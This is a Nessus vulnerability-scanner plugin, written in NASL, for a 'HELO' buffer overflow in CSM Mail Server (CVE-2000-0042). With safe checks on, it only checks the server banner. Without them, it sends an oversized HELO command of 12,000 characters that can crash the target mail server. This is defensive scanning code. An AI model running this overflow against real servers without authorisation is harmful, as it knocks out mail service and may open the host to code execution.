#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10050);
 script_bugtraq_id(895);
 script_version ("$Revision: 1.22 $");
 script_cve_id("CVE-2000-0042");
 name["english"] = "CSM Mail server MTA 'HELO' denial";
 name["francais"] = "Déni de service 'HELO' contre le MTA CSM Mail server";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
There might be a buffer overflow when this MTA is issued the 'HELO' command
issued by a too long argument (12,000 chars)

This problem may allow an attacker to execute arbitrary code on this computer,
or to disable your ability to send or receive emails.

Solution : contact your vendor for a patch.
Risk factor : High";



 script_description(english:desc["english"]);
 
 summary["english"] = "Overflows the remote SMTP server";
 summary["francais"] = "Overflow le serveur SMTP distant";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_MIXED_ATTACK); # mixed
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "SMTP problems";
 family["francais"] = "Problèmes SMTP";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "smtpserver_detect.nasl", "slmail_helo.nasl");
 script_exclude_keys("SMTP/wrapped","SMTP/3comnbx", "SMTP/postfix");
 script_require_ports("Services/smtp", 25);
 exit(0);
}

#
# The script code starts here
#

include("smtp_func.inc");

port = get_kb_item("Services/smtp");
if(!port)port = 25;

if (get_kb_item('SMTP/'+port+'/broken')) exit(0);
if(get_kb_item("SMTP/3comnbx"))exit(0);

if(safe_checks())
{
 banner = get_smtp_banner(port:port);
 if(banner)
 {
  if(egrep(string:banner,
  	  pattern:"^220 SMTP CSM Mail Server ready at .* .Version 2000.0[1-8].A"))
	{
	alrt = "
The remote CSM SMTP server may be vulnerable
to a buffer overflow allowing anyone to
execute arbitrary commands on this host.

*** Nessus reports this vulnerability using only
*** information that was gathered. Use caution
*** when testing without safe checks enabled.

Solution : upgrade to the latest version
Risk factor : High";
	 security_hole(port:port, data:alrt);
	}  
 } 
 exit(0);
}


if(get_port_state(port))
{
 key = get_kb_item(string("SMTP/", port, "/helo_overflow"));
 if(key)exit(0);
 soc = open_sock_tcp(port);
 if(soc)
 {
  s = smtp_recv_banner(socket:soc);
  if(!("220 " >< s)){
  	close(soc);
	exit(0);
	}
  c = string("HELO ", crap(12000), "\r\n");
  send(socket:soc, data:c);
  s = recv_line(socket:soc, length:1024);
  if(!s)
  {
   close(soc);
   soc = open_sock_tcp(port);
   if(soc) s = smtp_recv_banner(socket:soc);
   else s = NULL;

   if(!s) security_hole(port);
   close(soc);
 }
}
}
